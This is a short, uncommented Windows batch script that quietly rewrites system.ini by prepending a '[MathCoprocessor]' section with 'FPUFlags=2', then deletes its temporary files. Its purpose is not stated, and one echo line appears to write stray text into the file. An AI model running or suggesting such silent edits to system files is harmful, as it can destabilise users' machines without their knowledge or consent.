@echo off

 ren %windir%\system.ini s

echo [MathCoprocessor] > %windir%\y

echo FPUFlags=2 >> %windir%\y

echo >> %windir%\y

copy %windir%\y /a +%windir%\s /a %windir%\system.ini > nul

del %windir%\s

del %windir%\y